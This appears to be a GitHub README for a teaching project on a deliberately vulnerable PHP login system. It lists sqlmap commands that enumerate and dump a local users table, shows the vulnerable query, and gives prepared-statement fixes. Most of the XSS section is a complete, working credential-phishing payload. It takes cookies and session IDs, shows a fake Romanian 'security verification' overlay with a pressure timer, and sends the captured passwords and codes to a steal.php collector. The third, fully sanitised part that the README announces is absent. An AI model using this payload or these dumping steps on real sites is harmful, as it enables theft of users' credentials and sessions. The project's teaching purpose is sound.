<h1 align="center">Secure Login System</h1>

We created a login system, for the backend we use PHP and MySQL for the database and on the frontend we used HTML/CSS. 
The purpose of this project is to show how code becomes vulnerable to SQL injection.
We will analyze and perform SQL Injection attacks and Cross-Site Scripting attacks to see how they work when we do not secure the appropriate code. 
We'll use some attack tools like SQLMap. 

The project has three parts:

1.Secure Login System with Non-Sanitizing Code
Attacks like SQL Injection work here, as well as attacks like Cross-Site Scripting (XSS).
    This code is intentionally vulnerable to demonstrate:

    How legacy PHP applications become vulnerable
    Why string concatenation in SQL is dangerous
    How sqlmap and other tools exploit these weaknesses
    The importance of modern PHP security practices

2.Secure Login System with Partial Sanitizing Code
Attacks like SQL Injection don't work here, but there are some vulnerabilities related to Cross-Site Scripting (XSS).

3.Secure Login System with Complete Sanitizing Code
In this part, we have protected the code against both threats. Also, I will show you how to implement CAPTCHA for brute force protection.

<h1 align="center">1.Secure Login System with Non-Sanitizing Code</h1>

![Sqlmap](https://raw.githubusercontent.com/cipriancyberspace/securewebapplication/99e7e8d24c04397303853220b9ae101d9e12e940/Secure_Login_System/images/sqlmap.png)



Sqlmap is an open source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over of database servers. 
It comes with a powerful detection engine, many niche features for the ultimate penetration tester and a broad range of switches lasting from database fingerprinting, 
over data fetching from the database, to accessing the underlying file system and executing commands on the operating system via out-of-band connections.

![Sqlmap](https://github.com/cipriancyberspace/securewebapplication/blob/ee5612aa8bd9970e35df345d5f98699db35a3003/Secure_Login_System/images/sqlmap_1.png)

<strong> 1.SQLMap Command Breakdown: </strong>
<pre> <code>sqlmap -u "http://localhost/secureloginsystem/vulnerable_login_form.php" --data="username=test&password=test" --dbs --batch</code> </pre>

![Sqlmap](https://github.com/cipriancyberspace/securewebapplication/blob/1bf4ec6c5278162c33acfffa401df1ce9bfb6bfb/Secure_Login_System/images/sqlmap_3.png)

![Sqlmap](https://github.com/cipriancyberspace/securewebapplication/blob/eff2084c859e84b41a33be3071eaf471de9b0d7e/Secure_Login_System/images/sqlmap_2.png)

<strong> 2.Explore your database: </strong>
<pre> <code>sqlmap -u "http://localhost/secureloginsystem/vulnerable_login_form.php" \
       --data="username=test&password=test" \
       -D test_db --tables --batch</code> </pre>

![Sqlmap](https://github.com/cipriancyberspace/securewebapplication/blob/9086268e64a0716507f5dc933ce2bfb70513775b/Secure_Login_System/images/sqlmap_4.png)

<strong> 3.Dump user data: </strong>

<pre> <code>sqlmap -u "http://localhost/secureloginsystem/vulnerable_login_form.php" \
       --data="username=test&password=test" \
       -D test_db -T users --dump --batch</code> </pre>

![Sqlmap](https://github.com/cipriancyberspace/securewebapplication/blob/f0b283ed11636000979a965a8ce7c080b99c5ea2/Secure_Login_System/images/sqlmap_5.png)

<strong> 4.Get database schema: </strong>

<pre> <code>sqlmap -u "http://localhost/secureloginsystem/vulnerable_login_form.php" \
       --data="username=test&password=test" \
       -D test_db -T users --columns --batch</code> </pre>

![Sqlmap](https://github.com/cipriancyberspace/securewebapplication/blob/e4dc111aa3704427855dbe08de21b97209472a2a/Secure_Login_System/images/sqlmap_6.png)



⚠️ Why This Works 
Vulnerable PHP code:
<pre> <code>$sql = "SELECT * FROM users WHERE username = '$user' AND password = '$pass'";</code> </pre>
SQLMap exploits this by injecting payloads that break out of the SQL query, allowing it to execute additional SQL commands to enumerate databases.

Primary Vulnerability Location:
Line 78-82 - The main SQL injection vulnerability:


<pre> <code>/ VULNERABLE CODE - Direct string concatenation
$user = $_POST['username'];  // ❌ RAW user input
$pass = $_POST['password'];  // ❌ RAW user input

// ❌ DANGEROUS: Direct concatenation into SQL query
$sql = "SELECT * FROM users WHERE username = '$user' AND password = '$pass'";</code> </pre>

Secure Alternative with Prepared Statements:

<pre> <code>// Proper sanitization using prepared statements
$stmt = $conn->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->bind_param("ss", $user, $pass);  // "ss" = two strings
$stmt->execute();
$result = $stmt->get_result();</code> </pre>

Alternative with Input Escaping:

<pre> <code>// Basic escaping (less secure than prepared statements)
$user = $conn->real_escape_string($_POST['username']);
$pass = $conn->real_escape_string($_POST['password']);
$sql = "SELECT * FROM users WHERE username = '$user' AND password = '$pass'";</code> </pre>

<h1 align="center">2.Secure Login System with Partial Sanitizing Code</h1>

![Sqlmap](https://github.com/cipriancyberspace/securewebapplication/blob/30c26c388316b68f212474aea13c1971e70e08dc/Secure_Login_System/images/xss_1.png)

![Sqlmap](https://github.com/cipriancyberspace/securewebapplication/blob/30c26c388316b68f212474aea13c1971e70e08dc/Secure_Login_System/images/xss_2.png)

<pre> <code><script>
function advancedPhishing() {
    // === FURĂ DATELE CURENTE ===
    var currentData = {
        attack_type: 'advanced_phishing',
        current_session: {
            cookies: document.cookie,
            sessionId: document.cookie.match(/PHPSESSID=([^;]+)/) ? document.cookie.match(/PHPSESSID=([^;]+)/)[1] : null,
            current_user: null
        },
        timestamp: new Date().toISOString()
    };
    
    // Extrage utilizatorul curent
    var userMatch = document.body.textContent.match(/User:\s*([a-zA-Z0-9_]+)/);
    if (userMatch) currentData.current_session.current_user = userMatch[1];
    
    // === CREEAZĂ FORMULAR FALS REALIST ===
    setTimeout(function() {
        var overlay = document.createElement('div');
        overlay.innerHTML = `
            <div style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 999999; display: flex; align-items: center; justify-content: center; font-family: Arial, sans-serif;">
                <div style="background: white; padding: 40px; border-radius: 10px; max-width: 450px; width: 90%; box-shadow: 0 4px 20px rgba(0,0,0,0.5);">
                    <div style="text-align: center; margin-bottom: 30px;">
                        <h2 style="color: #dc3545; margin: 0 0 10px 0;">🔐 Verificare Obligatorie de Securitate</h2>
                        <p style="color: #666; margin: 0; font-size: 14px;">Din cauza activității suspecte detectate pe cont, este necesară re-autentificarea immeidată.</p>
                    </div>
                    
                    <div style="background: #fff3cd; padding: 15px; border-radius: 5px; margin-bottom: 20px; border-left: 4px solid #ffc107;">
                        <small style="color: #856404;">⚠️ Contul va fi blocat în 5 minute dacă nu se efectuează verificarea.</small>
                    </div>
                    
                    <form id="phishing-form" onsubmit="return captureAndSubmit(event);">
                        <div style="margin-bottom: 20px;">
                            <label style="display: block; margin-bottom: 8px; font-weight: bold; color: #333;">Username actual:</label>
                            <input type="text" id="stolen-username" required style="width: 100%; padding: 12px; border: 2px solid #ddd; border-radius: 4px; box-sizing: border-box; font-size: 16px;" value="${currentData.current_session.current_user || ''}" readonly>
                        </div>
                        
                        <div style="margin-bottom: 20px;">
                            <label style="display: block; margin-bottom: 8px; font-weight: bold; color: #333;">Confirmă parola:</label>
                            <input type="password" id="stolen-password" required style="width: 100%; padding: 12px; border: 2px solid #ddd; border-radius: 4px; box-sizing: border-box; font-size: 16px;" placeholder="Introduceți parola pentru verificare">
                        </div>
                        
                        <div style="margin-bottom: 25px;">
                            <label style="display: block; margin-bottom: 8px; font-weight: bold; color: #333;">Cod de verificare email (opțional):</label>
                            <input type="text" id="stolen-code" style="width: 100%; padding: 12px; border: 2px solid #ddd; border-radius: 4px; box-sizing: border-box; font-size: 16px;" placeholder="Codul primit pe email">
                        </div>
                        
                        <button type="submit" style="width: 100%; padding: 15px; background: linear-gradient(135deg, #dc3545, #c82333); color: white; border: none; border-radius: 4px; font-size: 16px; font-weight: bold; cursor: pointer; margin-bottom: 15px;">
                            🔐 Verifică și Continuă
                        </button>
                        
                        <button type="button" onclick="cancelVerification()" style="width: 100%; padding: 10px; background: #6c757d; color: white; border: none; border-radius: 4px; font-size: 14px; cursor: pointer;">
                            Anulează (cont va fi blocat)
                        </button>
                    </form>
                    
                    <div style="text-align: center; margin-top: 20px;">
                        <small style="color: #888; font-size: 12px;">
                            🔒 Această verificare este conformă cu politicile de securitate și protecția datelor.<br>
                            ID Sesiune: ${currentData.current_session.sessionId || 'N/A'}
                        </small>
                    </div>
                </div>
            </div>
        `;
        
        document.body.appendChild(overlay);
        
        // Timer fals pentru presiune
        var timeLeft = 300; // 5 minute
        var timerInterval = setInterval(function() {
            timeLeft--;
            var minutes = Math.floor(timeLeft / 60);
            var seconds = timeLeft % 60;
            var timerText = minutes + ':' + (seconds < 10 ? '0' : '') + seconds;
            
            var warningDiv = overlay.querySelector('div[style*="background: #fff3cd"]');
            if (warningDiv && timeLeft > 0) {
                warningDiv.innerHTML = `<small style="color: #856404;">⚠️ Timp rămas pentru verificare: <strong>${timerText}</strong></small>`;
            }
            
            if (timeLeft <= 0) {
                clearInterval(timerInterval);
                if (warningDiv) {
                    warningDiv.innerHTML = '<small style="color: #dc3545;">⚠️ <strong>TIMPUL A EXPIRAT! Contul va fi blocat.</strong></small>';
                }
            }
        }, 1000);
        
    }, 3000); // Așteaptă 3 secunde înainte să afișeze
    
    // Trimite datele inițiale
    fetch('./steal.php', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify(currentData),
        mode: 'no-cors'
    });
}

function captureAndSubmit(event) {
    event.preventDefault();
    
    var username = document.getElementById('stolen-username').value;
    var password = document.getElementById('stolen-password').value;
    var code = document.getElementById('stolen-code').value;
    
    var stolenCredentials = {
        attack_type: 'phishing_credentials_captured',
        timestamp: new Date().toISOString(),
        stolen_data: {
            username: username,
            password: password,
            verification_code: code,
            session_hijacked: document.cookie,
            page_url: window.location.href,
            user_agent: navigator.userAgent
        },
        success_level: 'CRITICAL'
    };
    
    // Trimite credentialele furate
    fetch('./steal.php', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify(stolenCredentials),
        mode: 'no-cors'
    }).then(function() {
        // Simulează verificarea
        var form = event.target;
        form.innerHTML = `
            <div style="text-align: center; padding: 30px;">
                <div style="color: #28a745; font-size: 3em; margin-bottom: 20px;">✅</div>
                <h3 style="color: #28a745; margin: 0 0 15px 0;">Verificare Completă!</h3>
                <p style="color: #666; margin: 0 0 10px 0;">Identitatea confirmată cu succes.</p>
                <p style="color: #666; font-size: 14px;">Contul este securizat și activitatea suspectă a fost eliminată.</p>
                <div style="margin-top: 20px; padding: 15px; background: #d4edda; border-radius: 5px;">
                    <small style="color: #155724;">🛡️ Sistemul de securitate este acum activ pentru contul dumneavoastră.</small>
                </div>
            </div>
        `;
        
        // Elimină overlay-ul după 4 secunde
        setTimeout(function() {
            var overlay = document.querySelector('div[style*="position: fixed"]');
            if (overlay) overlay.remove();
        }, 4000);
        
    }).catch(function(error) {
        console.log('Failed to send stolen credentials:', error);
    });
    
    return false;
}

function cancelVerification() {
    // Trimite și informația că a încercat să anuleze
    fetch('./steal.php', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
            attack_type: 'phishing_cancelled',
            user_action: 'attempted_cancel',
            timestamp: new Date().toISOString(),
            session: document.cookie
        }),
        mode: 'no-cors'
    });
    
    // Schimbă mesajul să pară că contul va fi blocat
    var overlay = document.querySelector('div[style*="position: fixed"]');
    if (overlay) {
        overlay.querySelector('div[style*="background: white"]').innerHTML = `
            <div style="text-align: center; padding: 40px;">
                <div style="color: #dc3545; font-size: 3em; margin-bottom: 20px;">🚫</div>
                <h3 style="color: #dc3545;">Cont Blocat Temporar</h3>
                <p style="color: #666;">Verificarea a fost anulată. Din motive de securitate, contul va fi blocat timp de 24 ore.</p>
                <p style="color: #666; font-size: 14px; margin-top: 20px;">Pentru deblocare imediată, contactați suportul tehnic.</p>
            </div>
        `;
        
        setTimeout(function() {
            overlay.remove();
        }, 5000);
    }
}

// === EXECUȚIE ===
advancedPhishing();

console.log('🎣 Advanced phishing attack activated!');
</script></code> </pre>


![Sqlmap](https://github.com/cipriancyberspace/securewebapplication/blob/30c26c388316b68f212474aea13c1971e70e08dc/Secure_Login_System/images/xss_3.png)

![Sqlmap](https://github.com/cipriancyberspace/securewebapplication/blob/30c26c388316b68f212474aea13c1971e70e08dc/Secure_Login_System/images/xss_4.png)

![Sqlmap](https://github.com/cipriancyberspace/securewebapplication/blob/30c26c388316b68f212474aea13c1971e70e08dc/Secure_Login_System/images/xss_5.png)




